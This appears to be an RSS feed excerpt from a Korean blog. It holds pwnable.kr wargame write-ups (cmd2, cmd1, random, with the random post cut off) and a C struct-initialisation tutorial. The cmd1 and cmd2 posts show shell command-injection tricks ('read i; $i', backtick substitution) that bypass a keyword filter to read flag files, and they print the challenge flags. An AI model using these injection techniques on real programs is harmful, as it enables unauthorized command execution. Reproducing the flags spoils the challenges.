&lt;p&gt;read는 읽어들여 변수에 저장하는 방법이다. 명령을 읽어들이게 하여 &lt;code class=&quot;language-text&quot;&gt;system&lt;/code&gt;함수에서 읽어들인 명령을 수행하도록 만드는게 목표이다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;cmd2@ubuntu:~$ &lt;span class=&quot;token builtin class-name&quot;&gt;read&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$i&lt;/span&gt;
&lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;
^D
&lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음과 같이 읽어들인 내용이 i변수에 저장됨을 볼 수 있다. &lt;code class=&quot;language-text&quot;&gt;$i&lt;/code&gt;를 &lt;code class=&quot;language-text&quot;&gt;echo&lt;/code&gt;의 인자로 주었는데 인자로 주지 않고 수행하는것을 보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;cmd2@ubuntu:~$ &lt;span class=&quot;token builtin class-name&quot;&gt;read&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$i&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt;
^D
cmd2  cmd2.c  flag&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ls 명령이 정상적으로 실행된다. &lt;code class=&quot;language-text&quot;&gt;read i; $i&lt;/code&gt; 라는 문자열은 filter에 걸리지 않으므로 정상적으로 수행시킬 수 있는 내용이다.&lt;/p&gt;
&lt;p&gt;이를 이용하여 문제를 해결해 보도록 하겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;cmd2@ubuntu:~$ ./cmd2 &lt;span class=&quot;token string&quot;&gt;&quot;read i; \&lt;span class=&quot;token variable&quot;&gt;$i&lt;/span&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;token builtin class-name&quot;&gt;read&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$i&lt;/span&gt;
/bin/cat /home/cmd2/flag
FuN_w1th_5h3ll_v4riabl3s_haha&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr cmd1]]></title><description><![CDATA[flag, sh, tmp라는 문자열을 필터링하는 문제이다. 하지만 이 문제는 system함수를 사용하므로 쉘의 기능을 이용하는걸 생각해 보아야 한다.  를 할 경우 command…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 21 Aug 2016 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;cmd1@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;$ cat cmd1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; r&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;tmp&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; envp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;putenv&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;PATH=/fuckyouverymuch&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;flag, sh, tmp라는 문자열을 필터링하는 문제이다. 하지만 이 문제는 system함수를 사용하므로 쉘의 기능을 이용하는걸 생각해 보아야 한다.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&lt;b&gt;&lt;code class=&quot;language-text&quot;&gt;command&lt;/code&gt;&lt;/b&gt;&lt;/code&gt; 를 할 경우 command를 실행한 후 그 프로그램의 &lt;code class=&quot;language-text&quot;&gt;stdout&lt;/code&gt;으로 나오는 내용을 쉘에서 실행하게 된다.&lt;/p&gt;
&lt;p&gt;간단한 예제로 보게되면 다음과 같은 결과를 낼 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;cmd1@ubuntu:~$ &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;/bin/cat&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt;
^D
cmd1  cmd1.c  flag&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;/code&gt;&lt;/strong&gt;으로 감싼 cat을 실행할 때, cat은 입력을 그대로 출력한다.&lt;/p&gt;
&lt;p&gt;그로인해 &lt;code class=&quot;language-text&quot;&gt;ls&lt;/code&gt;를 입력했는데, 이 내용이 &lt;code class=&quot;language-text&quot;&gt;cmd1@ubuntu:~$ ls&lt;/code&gt; 와 같이 수행되게 된다. 이를 이용하여 문제를 해결해 보도록 하겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;cmd1@ubuntu:~$ ./cmd1 &lt;span class=&quot;token string&quot;&gt;&quot;\&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;/bin/cat&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;
/bin/cat /home/cmd1/flag
mommy now I get what &lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt; environment is &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Struct 초기화]]></title><description><![CDATA[위와 같이 일반적으로 사용하는 방법이다. s1의 경우는 값을 변수마다 직접 넣어주는 방법이다. 이 방법은 선언후 따로 사용이 가능하다. s2의 경우는 기존의 값을 복사하는 연산이다. 이 과정에서 주의할 점은 struct…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 24 Jul 2016 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; b&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;s&lt;/span&gt; s1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; s2&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  s1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  s1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  s2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; s1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;s&lt;/span&gt; s3 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;s&lt;/span&gt; s4 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같이 일반적으로 사용하는 방법이다.&lt;/p&gt;
&lt;p&gt;s1의 경우는 값을 변수마다 &lt;strong&gt;직접&lt;/strong&gt; 넣어주는 방법이다. 이 방법은 &lt;strong&gt;선언후&lt;/strong&gt; 따로 사용이 가능하다.&lt;/p&gt;
&lt;p&gt;s2의 경우는 기존의 값을 &lt;strong&gt;복사&lt;/strong&gt;하는 연산이다.&lt;/p&gt;
&lt;p&gt;이 과정에서 주의할 점은 struct에서 문자열을 사용할 때 &lt;code class=&quot;language-text&quot;&gt;char[]&lt;/code&gt;을 사용하지 않고, &lt;code class=&quot;language-text&quot;&gt;char*&lt;/code&gt; 을 사용할 경우 &lt;strong&gt;포인터의 주소&lt;/strong&gt;가 복사되므로 이 과정에서는 따로 처리를 해주어야 한다.&lt;/p&gt;
&lt;p&gt;문자열과 관련된 부분은 항상 주의깊게 살펴야 한다.&lt;/p&gt;
&lt;p&gt;s3의 경우는 순서대로 하나씩 넣는 경우이다. a에 1을, b에 2를 넣는 것이다.&lt;/p&gt;
&lt;p&gt;이 방법에서는 생략이 가능한데, 생략된 부분은 0의 값을 가진다. 이 경우에서는 &lt;strong&gt;선언에서만&lt;/strong&gt; 초기화가 가능하다.&lt;/p&gt;
&lt;p&gt;s4의 경우는 s3와 마찬가지로 선언과 동시에 초기화가 가능한 방법이다.&lt;/p&gt;
&lt;p&gt;이 방법은 s3와 유사한 방법이지만, s1과 같이 하나씩 직접 넣어준다. 이 방법에서도 초기화하지 않은 변수의 경우는 0의 값을 가지게 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr random]]></title><description><![CDATA[문제는 다음과 같다. 랜덤한 값과 입력한 값을 xor…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 23 Jul 2016 18:00:00 GMT</pubDate><content:encoded>&lt;p&gt;문제는 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; random&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    random &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// random value!&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; key&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; random&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xdeadbeef&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Good!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Wrong, maybe you should try 2^32 cases.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;랜덤한 값과 입력한 값을 xor연산을 한 결과가 &lt;code class=&quot;language-text&quot;&gt;0xdeadbeef&lt;/code&gt;를 만들면 되는 문제이다.&lt;/p&gt;
&lt;p&gt;이 문제를 풀기 위해 다음의 코드를 살펴보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; random&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  random &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;rand() : %d\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; random&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 코드는 랜덤 값을 출력하는 프로그램이다. 이 프로그램을 실행하면 다음과 같은 결과를 볼 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;random@ubuntu:/tmp/micalgenus$ ./random
rand&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1804289383&lt;/span&gt;
random@ubuntu:/tmp/micalgenus$ ./random
rand&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1804289383&lt;/span&gt;
random@ubuntu:/tmp/micalgenus$ ./random
rand&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1804289383&lt;/span&gt;
random@ubuntu:/tmp/micalgenus$ ./random
rand&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1804289383&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;항상 같은 결과를 볼 수 있다. 이 이유는 &lt;code class=&quot;language-text&quot;&gt;rand함수&lt;/code&gt;의 특징 때문에 그러는데, rand의 경우 &lt;code class=&quot;language-text&quot;&gt;시드&lt;/code&gt;를 받아 그 값을 이용하여 연산을 하는 함수이다.&lt;/p&gt;
&lt;p&gt;rand를 하기 전에 &lt;code class=&quot;language-text&quot;&gt;srand(time(NULL))&lt;/code&gt;을 자주 해주는데, srand는 rand의 &lt;strong&gt;초기값&lt;/strong&gt;을 설정해 주는 함수이다.&lt;/p&gt;
